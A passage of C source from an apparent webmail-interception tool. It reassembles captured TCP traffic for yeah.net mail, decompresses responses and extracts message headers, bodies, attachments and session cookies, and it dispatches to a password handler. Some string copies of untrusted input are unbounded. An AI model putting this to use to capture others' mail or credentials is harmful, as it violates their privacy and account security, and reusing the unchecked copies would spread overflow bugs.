			if(attach_info->recive_data == NULL)
				return -1;
			memset(attach_info->recive_data,0,attach_info->recive_length);
			if(strstr(data,"Transfer-Encoding: chunked\r\n"))
			{
				isChunked = 1;
				front = strstr(front,"\r\n");
				front += 2;
			}
			if(strstr(data,"Content-Encoding: gzip\r\n"))
			{
				attach_info->ok_gzip = 1;
			}
			attach_info->ok_len = data_len;
			dataLen = front-data;
			attach_info->is_writing = 1;
			if(strstr(data + data_len - 4, "\r\n\r\n") || attach_info->recive_length-1000 == attach_info->ok_len - dataLen)
			{
				memcpy(attach_info->recive_data, front, attach_info->recive_length-1000);
				if(attach_info->ok_gzip)
				{
					char *tmp = (char *)malloc(attach_info->recive_length*30);
					memset(tmp,0,attach_info->recive_length*30);
					decomp_gzip_2(attach_info->recive_data,attach_info->recive_length-1000,&tmp);
					if(tmp == NULL) 
						return -1;
					free(attach_info->recive_data);
					attach_info->recive_data = tmp;
					attach_info->recive_length=strlen(attach_info->recive_data)+1000;
				}//printf("\nattach_info->recive_length = %d\n",attach_info->recive_length);
				fd = open(attach_info->path_of_here, O_RDWR|O_CREAT, file_mode);
				if (fd == -1)
					return -1;
				write(fd, attach_info->recive_data, attach_info->recive_length-1000);
				close(fd);
				UpdateAttachNew(attach_info->attach_name, attach_info->attname, attach_info->ID_str);
				return -1;
			}
			else
			{
				//memcpy(attach_info->recive_data, front, dataLen);
				fd = open(attach_info->path_of_here, O_RDWR|O_CREAT, file_mode);
				if (fd == -1)
					return -1;
				write(fd, front, data_len - (front - data));
				close(fd);
			}
		}
		else
		{
			int len;
			char *front, *back;
			front = strstr(data, "&mid=");
			if(front == NULL)
				return 0;
			front += 5;
			back = strstr(front, "&");
			if(back == NULL)
				return 0;
			len = back - front;
			len = (len > MAX_ID_LEN ? MAX_ID_LEN : len);
			memcpy(attach_info->ID_str, front, len);
			attach_info->ID_str[len] = '\0';
			htmldecode_full(attach_info->ID_str, attach_info->ID_str);
		}
	}
	
	return 1;
}

int analyse_yeah_rcvmail_attach(Mail_info *mail_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{
	unsigned int seq=ntohl(ptcp->seq);
	int off_seq=seq-mail_info->start_seq;
	int range;
	unsigned int attach_len;
	static int n;
	static int attach_length = -1, getted_size = 0;

	if (is_to_s)
	{
		if(!strncmp(data, "GET /", 5))
		{
			int len;
			char *front, *back;
			front = strstr(data, "&mid=");
			if(front == NULL)
				return 0;
			front += 5;
			back = strstr(front, "&");
			if(back == NULL)
				return 0;
			len = back - front;
			len = (len > MAX_ID_LEN ? MAX_ID_LEN : len);
			memcpy(mail_info->mail_id, front, len);
			mail_info->mail_id[len] = '\0';
			htmldecode_full(mail_info->mail_id, mail_info->mail_id);
		}
	}
	else
	{
		if(!strncmp(data,"HTTP/1.1 200 OK\r\n",15))
		{
			mail_info->recive_length = get_http_length(data);
			n = judge_chunk(data);
			//printf("mail_info->recive_length = %d\n", mail_info->recive_length);
			if(mail_info->recive_length <= 0)
			{
				//printf("mail_info->recive_length < 0\n");
				return -1;
			}
			mail_info->recive_length += 1000;
			mail_info->recive_data = (char *)malloc(mail_info->recive_length);
			if(mail_info->recive_data == NULL)
			{
				//printf("mail_info->recive_data == NULL\n");
				return -1;
			}
			memset(mail_info->recive_data, 0, mail_info->recive_length);
			mail_info->http_seq = seq;
		}
		if (mail_info->recive_data != NULL)
		{
			off_seq = seq-mail_info->http_seq;
			range = off_seq+data_len;
			if (range>mail_info->recive_length)
			{
				//mail_info->recive_data = realloc(mail_info->recive_data,mail_info->recive_length+8047);
				mail_info->recive_data = (char *)realloc(mail_info->recive_data,range+1);
				if(mail_info->recive_data == NULL)
					return -1;
				mail_info->recive_length=range;
				memcpy(mail_info->recive_data + off_seq, data, data_len); 
			}
			else
			{
				memcpy(mail_info->recive_data+off_seq, data, data_len);
			}
		}
		if (ptcp->fin == 1 || (data_len>0&&!memcmp(mail_info->recive_data+range-7,"\r\n0\r\n\r\n",7)) ||
		    (mail_info->recive_data != NULL&&mail_info->recive_length-1000 == range-(strstr(mail_info->recive_data,"\r\n\r\n")-mail_info->recive_data+4)))
		{
			mail_info->is_complished = 1;
			attach_len = mail_info->recive_length - 1000;
			write_attach_down_2(mail_info, attach_len,n);
			del_mail_node(mail_info);
		}

		return 0;
	}
	return 0;
}

int analyse_yeah_delete(Mail_info *mail_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{
	unsigned int seq;
	int off_seq;
	int result;

	seq = ntohl(ptcp->seq);
	off_seq = seq - mail_info->start_seq;
	if (is_to_s) {
		if (!mail_info->is_complished) {
			result = write_to_mail(mail_info, data, data_len, ptcp);
			return result;
		}
	} else if (!strncmp(data, "HTTP/1.1 200 OK\r\n", 15)){
		// the protocol different than before...
		mail_info->is_complished = 1;
#if 0
		char ID_pattern[] = "name=\"composeId\">(.*)</string><array name=";
		char file_pattern[] = "array name=\"items\"><string>(.*)</string></array>";
		char ID[MAX_ID_LEN + 1];
		char id_temp[MAX_ID_LEN + 1];
		char file_path[MAX_PATH_LEN + 1];

		mail_info->is_complished = 1;
		result = regcompile_1(mail_info->mail_data, "sid=(.*)&func=", ID, MAX_ID_LEN);
		if (result == -1) {
			return -1;
		}

		result = regcompile_1(mail_info->mail_data, ID_pattern, id_temp, MAX_ID_LEN);
		if (result == -1) {
			return -1;
		}
		if (strlen(ID) + strlen(id_temp) > MAX_ID_LEN)
			return -1;
		strcat(ID, id_temp);
		result = regcompile_1(mail_info->mail_data, file_pattern, file_path, MAX_PATH_LEN);
		if (result == -1) {
			return -1;
		}

		Attach_info *attach_tmp;
		attach_tmp = attach_tab.head->next;
		while (attach_tmp != NULL) {
			if (!strcmp(attach_tmp->ID_str, ID) && !strcmp(attach_tmp->path_of_sender, file_path)) {
				del_attach_node(attach_tmp);
				delete_attach(attach_tmp);
				break;
			}
			attach_tmp = attach_tmp->next;
		}
#endif
		del_mail_node(mail_info);
		return 0;
	} else {
		return -1;
	}
}

int get_yeah_rcvid(Mail_info *mail_info)
{
	char *pstart = NULL;
	char *pend = NULL;
	size_t len;
	int result;

	pstart = strstr(mail_info->mail_data, "; P_INFO=");
	if (pstart == NULL)
	{
		pstart = strstr(mail_info->mail_data, "; S_INFO=");
	}
	if(pstart == NULL)
		return -1;
	pstart += 9;
	pend = strstr(pstart, "; ");
	len = pend - pstart;
	len = (len > MAX_ID_LEN ? MAX_ID_LEN : len);
	memcpy(mail_info->connect_id, pstart, len);
	mail_info->connect_id[len] = 0;

	return 0;
}

int writefileyeah_rcvmail1(Mail_info *mail_info)
{
	char *pstart = NULL;
	char *pend = NULL;
	size_t len;
	size_t total_len;
	int result;
	char *pto = NULL;
	char *pcc = NULL;
	char *pover = NULL;

	if (mail_info == NULL || mail_info->recive_data == NULL)
		return -1;

	/*result = get_yeah_rcvid(mail_info);
	if (result == -1)
		return -1;*/
	strcpy(mail_info->connect_id,mail_info->mail_id);

	pstart = strstr(mail_info->recive_data, "'subject':'");
	if (pstart == NULL)
		return -1;
	pstart += 11;
	pend = strstr(pstart, "',\n");
	if (pend == NULL)
		return -1;
	len = pend - pstart;
	len = (len > MAX_SUBJ_LEN ? MAX_SUBJ_LEN : len);
	memcpy(mail_info->subject, pstart, len);
	mail_info->subject[len] = 0;                                      //printf("mail_info->subject = %s", mail_info->subject);

	pstart = strstr(mail_info->recive_data, "'from':['");
	if (pstart == NULL)
		return -1;
	pstart += 9;
	pend = strstr(pstart, "'],\n");
	if (pend == NULL)
		return -1;
	len = pend - pstart;
	len = (len > MAX_FROM_LEN ? MAX_FROM_LEN : len);
	memcpy(mail_info->from, pstart, len);
	mail_info->from[len] = 0;                                             //printf("mail_info->from = %s", mail_info->from);

	pstart = strstr(mail_info->recive_data, "\n'sentDate':new Date(");
	if (pstart == NULL)
		return -1;
	pstart += 21;
	pend = strstr(pstart, "),");
	if (pend == NULL)
		return -1;
	len = pend - pstart;
	if (len > MAX_TIME_LEN)
		return -1;
	memcpy(mail_info->sent_time, pstart, len);
	mail_info->sent_time[len] = 0;
	int i;
	pend = mail_info->sent_time;
	for (i = 0; i < 5; i++) 
	{
		pstart = strstr(pend, ",");
		if (pstart == NULL)
			break;
		switch (i) 
		{
			case 0:
				*pstart = '-';
				break;
			case 1:
				*pstart = '-';
				{
					char *p = pstart - 1;
					(*p)++;
					if (*p > '9') {
						*p -= 10;
						memmove(p, p+1, MAX_TIME_LEN - (p - mail_info->sent_time + 1) - 1); 
						*p = '1';
					}
				}
				break;
			case 2:
				*pstart = ' ';
				break;
			case 3:
			case 4:
				*pstart = ':';
				break;
		}
		pend = pstart;
	}
	//printf("mail_info->sent_time : %s\n", mail_info->sent_time);

	pstart = strstr(mail_info->recive_data, "'to':['");
	if(pstart == NULL)
		return -1;
	pstart += 7;
	pend = strstr(pstart, "'],");
	if (pend == NULL)
		return -1;
	len = pend - pstart;
	memcpy(mail_info->to, pstart, len);
	mail_info->to[len] = 0;                                           //printf("mail_info->to = %s\n", mail_info->to);

	pstart = strstr(mail_info->recive_data, "'cc':[");
	if(pstart != NULL)
	{
		pstart += 6;
		pend = strstr(pstart, "],");
		if (pend == NULL)
			return -1;
		len = pend - pstart;
		memcpy(mail_info->cc, pstart, len);
		mail_info->cc[len] = 0;
	}  
	makeStr(mail_info->from);
	makeStr(mail_info->to);
	makeStr(mail_info->cc);
	makeStr(mail_info->bcc);

	mail_info->mail_type = 0x0821;
	Mail_info *pre_mail = NULL;
	pre_mail = find_mail_head2(mail_info->connect_id, mail_info, mail_info->mail_type);
	if (pre_mail != NULL)
	{
		if(pre_mail->content != NULL)
		{
			clear_from(pre_mail->from);
			strcpy(pre_mail->mail_id, mail_info->mail_id);
			strcpy(pre_mail->bcc, mail_info->bcc);
			strcpy(pre_mail->cc, mail_info->cc);
			strcpy(pre_mail->from, mail_info->from);
			strcpy(pre_mail->to, mail_info->to);
			strcpy(pre_mail->subject, mail_info->subject);
			strcpy(pre_mail->sent_time,mail_info->sent_time);
			strcpy(pre_mail->cookie_data,mail_info->cookie_data);
			create_dir(pre_mail->save_path, "yeah" ,pre_mail->from);
			write_to_file(pre_mail);
//			write_oracle_db_cookieinfo(pre_mail);
			del_mail_node(pre_mail);
			del_mail_node(mail_info);
		}
	}
	else if(mail_info->content != NULL)
	{
		write_to_file(mail_info);
//		write_oracle_db_cookieinfo(mail_info);
		del_mail_node(mail_info);
	}
	return 0;
}

int writefileyeah_rcvmail2(Mail_info *mail_info)
{
	char *pstart = NULL;
	char *pend = NULL;
	int result;
	/*result = get_yeah_rcvid(mail_info);
	if (result == -1)
		return -1;*/

	pstart = strstr(mail_info->mail_data, "&mid=");
	if(pstart == NULL)
		return -1;
	pstart += 5;
	pend = strstr(pstart, "&color=");
	if(pend == NULL)
	{
		pend = strstr(pstart, " HTTP/1.1\r\n");
		if(pend == NULL)
			return -1;
	}
	int len = pend - pstart;
	len = (len > MAX_ID_LEN ? MAX_ID_LEN : len);
	memcpy(mail_info->mail_id, pstart, len);
	mail_info->mail_id[len] = 0;
	htmldecode_full(mail_info->mail_id, mail_info->mail_id);
	//printf("\nmail_info->mail_id : %s\n", mail_info->mail_id);
	strcpy(mail_info->connect_id,mail_info->mail_id);

	pstart = strstr(mail_info->recive_data, "</style>\r\n");
	if (pstart == NULL)
		return -1;
	pstart += 10;
	mail_info->content = mail_info->recive_data;//pstart;
	char *tmp = clear_html_tag(mail_info->content);
	if (tmp != NULL)
	{
		mail_info->content = tmp;
		pend = strstr(mail_info->content, "<script language=\"javascript\">");
		if(pend == NULL)
			pend = strstr(mail_info->content, "<script type=\"text/javascript\">");
		if(pend)
		{
			int length = pend - mail_info->content;
			char * temp = (char *)malloc(length + 1);
			memset(temp, 0, length + 1);
			memcpy(temp, mail_info->content, length);
			free(mail_info->content);
			mail_info->content = temp;
		}
		pend = strstr(mail_info->content, "try{parent.JS.modules");
		if(pend == NULL)
			pend = strstr(mail_info->content, "try{if(parent.");
		if(pend)
		{
			int length = pend - mail_info->content;
			char * temp = (char *)malloc(length + 1);
			memset(temp, 0, length + 1);
			memcpy(temp, mail_info->content, length);
			free(mail_info->content);
			mail_info->content = temp;
		}
		//printf("mail_info->content22222 : %s\n", mail_info->content);
	}

	mail_info->mail_type = 0x0822;
	Mail_info *pre_mail = NULL;
	pre_mail = find_mail_head2(mail_info->connect_id, mail_info, mail_info->mail_type);
	if (pre_mail != NULL)
	{
		if(pre_mail->to != NULL)
		{
			clear_from(pre_mail->from);
			pre_mail->content = clear_html_tag(mail_info->content);
			clear_tag(pre_mail->content);
			down_contents(pre_mail->content);
			create_dir(pre_mail->save_path, "yeah" ,pre_mail->from);
			write_to_file(pre_mail);
//			write_oracle_db_cookieinfo(pre_mail);
			del_mail_node(pre_mail);
			del_mail_node(mail_info);
		}
	}
	else if(strlen(mail_info->from) > 0)
	{
// 		printf("mail_info->mail_id : %s\n", mail_info->mail_id);
// 		printf("mail_info->from : %s\n", mail_info->from);
// 		printf("mail_info->bcc : %s\n", mail_info->bcc);
// 		printf("mail_info->cc : %s\n", mail_info->cc);
// 		printf("mail_info->to : %s\n", mail_info->to);
// 		printf("mail_info->subject : %s\n", mail_info->subject);
// 		printf("mail_info->sent_time : %s\n", mail_info->sent_time);
// 		printf("mail_info->content : %s\n", mail_info->content);
		write_to_file(mail_info);
//		write_oracle_db_cookieinfo(mail_info);
		del_mail_node(mail_info);
	}
	
	return 0;
}

int analyse_yeah_rcvmail1(Mail_info *mail_info,char *data,unsigned int data_len,struct tcphdr *ptcp,int is_to_s)
{//printf("\n                   analyse_yeah_rcvmail1\n");
	int result;
	char *dest = NULL;
	static int flag = -1;
	static int flagg = -1;

	if (is_to_s) 
	{
		if (!mail_info->is_complished) 
		{
			result = write_to_mail(mail_info, data, data_len, ptcp);
			if(IS_MOVE_WEBMAIL == 1 && data_len>0 && strstr(mail_info->mail_data,"%3Cstring%20name%3D%22mode%22%3Eboth%3C%2Fstring%3E"))
				mail_info->mail_type = 0x8122;
			return result;
		}
	} 
	else 
	{ //if (!strncmp(data, "HTTP/1.", 7) && !strncmp(data + 8, " 200 OK\r\n", 9)) {
		if (!strncmp(data, "HTTP/1.", 7) && !strncmp(data + 8, " 200 OK\r\n", 9))
		{//printf("\n4\n");
			if(strstr(data, "Content-Encoding: gzip"))
				flag = 1;
			else
				flag = 0;
			if(strstr(data, "Transfer-Encoding: chunked\r\n"))
				flagg = 1;
			else
				flagg = 0;
		}
		if (!mail_info->is_complished) 
		{
			if(flagg == 0)
			{
				//printf("\ngzip ...\n");
				result = write_chunked_okdata(mail_info, data, data_len, ptcp);
				mail_info->is_ok_chunked = 0;
			}
			else
			{
				//printf("\nchunked ...\n");
				result = write_to_okdata_chunked_gzip(mail_info, data, data_len, ptcp);
				mail_info->is_ok_chunked = 1;
			}
			if (result == -1)
				return -1;
		}
		//if (data_len < 14 || strncmp(data + data_len - 14, "</html>\r\n0\r\n\r\n", 14) == 0) {
		if (strstr(data, "\'attachments\':") || strncmp(data + data_len - 1, "}", 1) == 0 || !memcmp(data + data_len - 5, "0\r\n\r\n", 5)) 
		{//printf("\n       8888888888888\n");
			mail_info->is_complished = 1;
			if(flag == 1)
			{
				if (mail_info->is_ok_chunked)
				{
					//printf("111111\n");
					Chunked(mail_info);//printf("\nmail_info->recive_length111 = %d, mail_info->recive_data1111 = %s\n",mail_info->recive_length,mail_info->recive_data);
					result = decomp_gzip_3(mail_info->recive_data, mail_info->recive_length, &dest);
					if (result == -1)
					{
						result = decomp_gzip_1(mail_info->recive_data, mail_info->recive_length, &dest);
						if(result == -1)
						{
							result = decomp_gzip_2(mail_info->recive_data, mail_info->recive_length, &dest);
							if(result == -1) 
                                result = decomp_gzip(mail_info->recive_data, mail_info->recive_length, &dest);
						}
					}
				}
				else
				{
					result = decomp_gzip_3(mail_info->recive_data, mail_info->recive_length - 2, &dest);
					if(result == -1)
					{
						result = decomp_gzip_1(mail_info->recive_data, mail_info->recive_length - 2, &dest);
						if(result == -1)
						{
							result = decomp_gzip_2(mail_info->recive_data, mail_info->recive_length - 2, &dest);
							if(result == -1) 
                                result = decomp_gzip(mail_info->recive_data, mail_info->recive_length - 2, &dest);
						}
					}
				}
                
				if (result == -1)
				{
					LOG_WARN("webmail:analyse_163_rcvmail1: decomp_zip return error!\n");
					return -1;
				}
                
				free(mail_info->recive_data);
				mail_info->recive_data = dest;         //printf("\nmail_info->recive_data = %s\n",mail_info->recive_data);
				dest = NULL;
			}
			get_cookie(mail_info->mail_data, mail_info->cookie_data);
			htmldecode_full(mail_info->mail_data, mail_info->mail_data);
			char * i,* j;
			int len;
			i = strstr(mail_info->mail_data, "<string name=\"id\">");
			if(i == NULL)
				return 0;
			i += 18;
			j = strstr(i, "</string>");
			if(j == NULL)
				return 0;
			len = j - i;
			len = (len > MAX_ID_LEN ? MAX_ID_LEN : len);
			memcpy(mail_info->mail_id, i, len);
			mail_info->mail_id[len] = '\0';
			htmldecode_full(mail_info->mail_id, mail_info->mail_id);
			writefileyeah_rcvmail1(mail_info);
			return 0;
		}
	}
}

int analyse_yeah_rcvmail2(Mail_info *mail_info,char *data,unsigned int data_len,struct tcphdr *ptcp,int is_to_s)
{//printf("\n                       analyse_yeah_rcvmail2\n");
	int result;
	char *dest = NULL;
	static int flag = -1;
	static int flagg = -1;

	if (is_to_s) 
	{
		if (!mail_info->is_complished) 
		{
			result = write_to_mail(mail_info, data, data_len, ptcp);
			return result;
		}
	} 
	else 
	{ //if (!strncmp(data, "HTTP/1.", 7) && !strncmp(data + 8, " 200 OK\r\n", 9)) {
		if (!strncmp(data, "HTTP/1.", 7) && !strncmp(data + 8, " 200 OK\r\n", 9))
		{//printf("\n4\n");
			if(strstr(data, "Content-Encoding: gzip"))
				flag = 1;
			else
				flag = 0;
			if(strstr(data, "Transfer-Encoding: chunked\r\n"))
				flagg = 1;
			else
				flagg = 0;
		}
		if (!mail_info->is_complished)
		{
			if(flagg == 0)
			{
				//printf("\ngzip ...\n");
				result = write_to_okdata(mail_info, data, data_len, ptcp);
				mail_info->is_ok_chunked = 0;
			}
			else
			{
				//printf("\nchunked ...\n");
				result = write_to_okdata_chunked_gzip(mail_info, data, data_len, ptcp);
				mail_info->is_ok_chunked = 1;
			}
			if (result == -1)
				return -1;
		}
		if (ptcp->fin || data_len < 20 /*|| (ntohl(ptcp->seq) + data_len - mail_info->http_seq > mail_info->recive_length - 100)*/ || strstr(data + data_len - 20, "</html>") != NULL /*|| !strncmp(data, "HTTP/1.0 200 OK\r\n", 17)*/ || !memcmp(data + data_len - 5, "0\r\n\r\n", 5) || !strncmp(data + data_len - 11, "</script>\r\n",11) || !strncmp(data + data_len - 9, "</script>",9))
		{//printf("\n               111111111111111\n");
			mail_info->is_complished = 1;
			if(flag == 1)
			{
				if (mail_info->is_ok_chunked)
				{
					/*result = decomp_chunked_gzip(mail_info->recive_data, mail_info->recive_length - 5, &dest);
					if (result == -1)
					{
						fprintf(stderr, "webmail:analyse_yeah_rcvmail2: decomp_zip return error!\n");
						return -1;
					}
					free(mail_info->recive_data);
					mail_info->recive_data = dest;
					dest = NULL;*/
					Chunked(mail_info);
					result = decomp_gzip_3(mail_info->recive_data, mail_info->recive_length, &dest);
					if(result == -1)
					{
						result = decomp_gzip_1(mail_info->recive_data, mail_info->recive_length, &dest);
						if(result == -1)
						{
							result = decomp_gzip_2(mail_info->recive_data, mail_info->recive_length, &dest);
							if(result == -1) 
                                result = decomp_gzip(mail_info->recive_data, mail_info->recive_length, &dest);
						}
					}
				}
				else
				{
					result = decomp_gzip_3(mail_info->recive_data, mail_info->recive_length - 2, &dest);
					if(result == -1)
					{
						result = decomp_gzip_1(mail_info->recive_data, mail_info->recive_length - 2, &dest);
						if(result == -1)
						{
							result = decomp_gzip_2(mail_info->recive_data, mail_info->recive_length - 2, &dest);
							if(result == -1) 
                                result = decomp_gzip(mail_info->recive_data, mail_info->recive_length - 2, &dest);
						}
					}
				}
                
				if (result == -1) 
				{
					LOG_WARN("webmail:analyse_163_rcvmail1: decomp_zip return error!\n");
					return -1;
				}
                
				free(mail_info->recive_data);
				mail_info->recive_data = dest;
				dest = NULL;
			}
			writefileyeah_rcvmail2(mail_info);
			return 0;
		}
	}
}

int analyse_yeah_rcvmail3(Mail_info *mail_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{
	static int seq_get = 0;
	static int seq_post = 0;
	int result;
	if(!strncmp(data, "GET /js5/read/readhtml.jsp?ssid=", 32))
	{
		seq_get = ntohl(ptcp->seq)+data_len;
		result = analyse_yeah_rcvmail2(mail_info, data, data_len, ptcp, is_to_s);
		if (result == -1)
		{
			//printf("Error ... delete mail info ...\n");
			return -1;
		}
	}
	else if(ntohl(ptcp->seq) == seq_get || ntohl(ptcp->ack_seq) == seq_get)
	{
		seq_get = ntohl(ptcp->seq)+data_len;
		result = analyse_yeah_rcvmail2(mail_info, data, data_len, ptcp, is_to_s);
		if (result == -1)
		{
			//printf("Error ... delete mail info ...\n");
			return -1;
		}
	}
	else if(!strncmp(data, "POST /js5/s?sid=", 16) && memfind(data, "&func=mbox:readMessage", 100) != NULL)
	{
		seq_post = ntohl(ptcp->seq)+data_len;
		result = analyse_yeah_rcvmail1(mail_info, data, data_len, ptcp, is_to_s);
		if (result == -1)
		{
			//printf("Error ... delete mail info ...\n");
			return -1;
		}
	}
	else if(ntohl(ptcp->seq) == seq_post || ntohl(ptcp->ack_seq) == seq_post)
	{
		seq_post = ntohl(ptcp->seq)+data_len;
		result = analyse_yeah_rcvmail1(mail_info, data, data_len, ptcp, is_to_s);
		if (result == -1)
		{
			//printf("Error ... delete mail info ...\n");
			return -1;
		}
	}
	
}

int analyse_yeah_rcvmail4(Mail_info *mail_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{
    return analyse_163_rcvmail4(mail_info, data, data_len, ptcp, is_to_s);
}

void  analyse_yeah(void *node,char *data,unsigned int data_len,struct tcphdr *ptcp,int is_to_s,int m_or_a)
{
	unsigned short type;
	int result = 0;

	if (!m_or_a) 
	{
		Mail_info *mail_info = (Mail_info *)node;
		type = mail_info->mail_type & 0x00FF;
		switch (type) 
		{
		case 0x11:
			result = analyse_yeah_content(mail_info, data, data_len, ptcp, is_to_s);
			break;
		case 0x01:
			result = analyse_yeah_passwd(mail_info, data, data_len, ptcp, is_to_s);
			break;
		case 0x41:
			// yeah upload attachment action handler
			// by jacky Fri Mar  3 20:08:41 PST 2017
			result = analyse_yeah_delete(mail_info, data, data_len, ptcp, is_to_s);
			break;
		case 0x21:
			//printf("analyse_yeah_rcvmail1\n");
			result = analyse_yeah_rcvmail1(mail_info, data, data_len, ptcp, is_to_s);
			break;
		case 0x22:
			//printf("analyse_yeah_rcvmail2\n");
			result = analyse_yeah_rcvmail2(mail_info, data, data_len, ptcp, is_to_s);
			break;
		case 0x23:
			//printf("analyse_yeah_rcvmail3\n");
			result = analyse_yeah_rcvmail3(mail_info, data, data_len, ptcp, is_to_s);
			break;
		case 0x24:
			//printf("analyse_yeah_rcvmail_attach ...\n");
			result = analyse_yeah_rcvmail_attach(mail_info, data, data_len, ptcp, is_to_s);
			break;
        case 0x26:
            result = analyse_yeah_rcvmail4(mail_info, data, data_len, ptcp, is_to_s);
		}
		
		if (result == -1)
			delete_mail_info(mail_info);
	} 
	else 
	{
		Attach_info *attach_info = (Attach_info *)node;
		type = attach_info->attach_type & 0x00FF;
		unsigned int f=0;
		switch (type) 
		{
		case 0x61:
			//printf("analyse_yeah_attach_1 ...\n");
			result = analyse_yeah_attach_1(attach_info, data, data_len, ptcp, is_to_s);
			break;
		case 0x62:
			//printf("analyse_yeah_attach_2 ...\n");
			result = analyse_yeah_attach_2(attach_info, data, data_len, ptcp, is_to_s);
			break;
		case 0x63:
			//printf("analyse_yeah_down_attach ...\n");
			result = analyse_yeah_down_attach(attach_info, data, data_len, ptcp, is_to_s);
			break;
		}
		if (result == -1) 
		{
			del_attach_node(attach_info);
			delete_attach(attach_info);
		}
	}
}
